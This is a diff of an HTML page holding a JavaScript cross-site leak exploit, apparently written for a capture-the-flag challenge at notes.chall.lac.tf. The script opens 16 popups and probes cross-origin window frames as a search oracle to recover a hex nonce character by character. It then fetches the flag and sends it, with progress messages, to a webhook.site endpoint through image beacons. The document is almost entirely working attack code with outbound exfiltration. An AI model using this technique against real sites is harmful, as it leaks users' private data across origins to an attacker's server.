@@ -1,98 +1,93 @@
 <!DOCTYPE html>
 <html>
 <body>
-<pre id="log"></pre>
 <script>
 var CHALL = 'https://notes.chall.lac.tf';
 var WH = 'https://webhook.site/c9c4e814-b8d9-47ab-ace4-1afa4d09088f';
+var HEX = '0123456789abcdef';
 
 function ping(m) { new Image().src = WH + '?' + encodeURIComponent(m); }
-function log(m) { document.getElementById('log').textContent += m + '\n'; }
 function sleep(ms) { return new Promise(function(r) { setTimeout(r, ms); }); }
 
+function url(prefix) {
+  return CHALL + '/?name=x&referrerPolicy=adf&search=' + encodeURIComponent(prefix);
+}
+
 async function run() {
-  ping('v14_start');
+  ping('xpl_start');
+  var t0 = Date.now();
 
-  // === T1: Comparison oracle - MATCH (no search = all notes shown) ===
-  // With name=adf on ads, check popup[0] === popup['adf']
-  // Nomatch: always true. Match: false when note is at index 0 (~1/N chance)
-  log('T1: comparison oracle - match');
-  var matchUrl = CHALL + '/?name=x&referrerPolicy=adf';
-  var w = window.open(matchUrl);
-  await sleep(1500);
-  var matchRes = [];
-  for (var i = 0; i < 20; i++) {
-    try {
-      var named = w['adf'];
-      if (!named) { matchRes.push('N'); }
-      else {
-        var eq = (w[0] === named) ? 'T' : 'F';
-        matchRes.push(w.length + eq);
-      }
-    } catch(e) { matchRes.push('E'); }
-    w.location = matchUrl;
-    await sleep(700);
+  // Open 16 popups up front (avoid close+reopen popup blocking)
+  var P = [];
+  for (var i = 0; i < 16; i++) {
+    try { P.push(window.open('about:blank')); } catch(e) { P.push(null); }
+    await sleep(20);
   }
-  w.close();
-  ping('t1_match=' + matchRes.join(','));
-  log('T1 done: ' + matchRes.join(','));
-  await sleep(300);
+  var cnt = 0;
+  for (var i = 0; i < 16; i++) if (P[i] && !P[i].closed) cnt++;
+  ping('pop=' + cnt);
+  if (cnt === 0) { ping('no_popups'); return; }
 
-  // === T2: Comparison oracle - NOMATCH ===
-  log('T2: comparison oracle - nomatch');
-  var nomatchUrl = CHALL + '/?name=x&referrerPolicy=adf&search=zzzzzzz';
-  w = window.open(nomatchUrl);
-  await sleep(1500);
-  var nomatchRes = [];
-  for (var i = 0; i < 20; i++) {
-    try {
-      var named = w['adf'];
-      if (!named) { nomatchRes.push('N'); }
-      else {
-        var eq = (w[0] === named) ? 'T' : 'F';
-        nomatchRes.push(w.length + eq);
+  var nonce = '';
+
+  for (var pos = 0; pos < 8; pos++) {
+    if (Date.now() - t0 > 50000) { ping('timeout_p' + pos); break; }
+
+    var found = null;
+    var n = Math.min(cnt, 16);
+
+    // Navigate all popups to their search URLs
+    for (var c = 0; c < n; c++) {
+      if (!P[c] || P[c].closed) continue;
+      try { P[c].location = url(nonce + HEX[c]); } catch(e) {}
+    }
+    await sleep(1300);
+
+    // Cycle: check oracle then reload
+    for (var cycle = 0; cycle < 25 && !found; cycle++) {
+      if (Date.now() - t0 > 54000) break;
+
+      for (var c = 0; c < n; c++) {
+        if (!P[c] || P[c].closed) continue;
+        try {
+          var ref = P[c]['adf'];
+          if (ref && P[c].length >= 6 && P[c][0] !== ref) {
+            found = HEX[c];
+            break;
+          }
+        } catch(e) {}
       }
-    } catch(e) { nomatchRes.push('E'); }
-    w.location = nomatchUrl;
-    await sleep(700);
+      if (found) break;
+
+      // Reload all for fresh shuffle
+      for (var c = 0; c < n; c++) {
+        if (!P[c] || P[c].closed) continue;
+        try { P[c].location = url(nonce + HEX[c]); } catch(e) {}
+      }
+      await sleep(550);
+    }
+
+    if (found) {
+      nonce += found;
+      ping('p' + pos + '=' + found);
+    } else {
+      ping('p' + pos + '=MISS');
+      break;
+    }
   }
-  w.close();
-  ping('t2_nomatch=' + nomatchRes.join(','));
-  log('T2 done: ' + nomatchRes.join(','));
-  await sleep(300);
 
-  // === T3: Name clearing via window.open ===
-  log('T3: name clearing test');
-  w = window.open(matchUrl);
-  await sleep(1500);
-  var t3 = {};
-  try {
-    t3.len = w.length;
-    // Can window.open find the named frame?
-    var o = window.open('about:blank', 'adf');
-    t3.gotRef = o ? 'yes' : 'no';
-    await sleep(200);
-    // Test cross-origin access
-    try { t3.oLen = o.length; } catch(e) { t3.oLen = 'E'; }
-    try { t3.oName = o.name; } catch(e) { t3.oName = 'E'; }
-    // Try setting name
-    try { o.name = ''; t3.setName = 'ok'; } catch(e) { t3.setName = 'E'; }
-    await sleep(100);
-    // Did it work? Check if popup['adf'] changed
-    t3.adfStill = w['adf'] ? 'yes' : 'no';
-    // Is the reference the same or different?
+  ping('n=' + nonce);
+
+  if (nonce.length === 8) {
     try {
-      var o2 = w['adf'];
-      t3.sameRef = (o2 === o) ? 'same' : 'diff';
-    } catch(e) { t3.sameRef = 'E'; }
-    t3.lenAfter = w.length;
-  } catch(e) { t3.err = e.message.substring(0, 40); }
-  w.close();
-  ping('t3=' + JSON.stringify(t3));
-  log('T3: ' + JSON.stringify(t3));
+      var r = await fetch(CHALL + '/guess?nonce=' + nonce);
+      var f = await r.text();
+      ping('FLAG=' + encodeURIComponent(f));
+    } catch(e) { ping('gerr'); }
+  }
 
-  ping('v14_done');
-  log('Done!');
+  for (var i = 0; i < 16; i++) { try { if(P[i]) P[i].close(); } catch(e) {} }
+  ping('done');
 }
 run();
 </script>
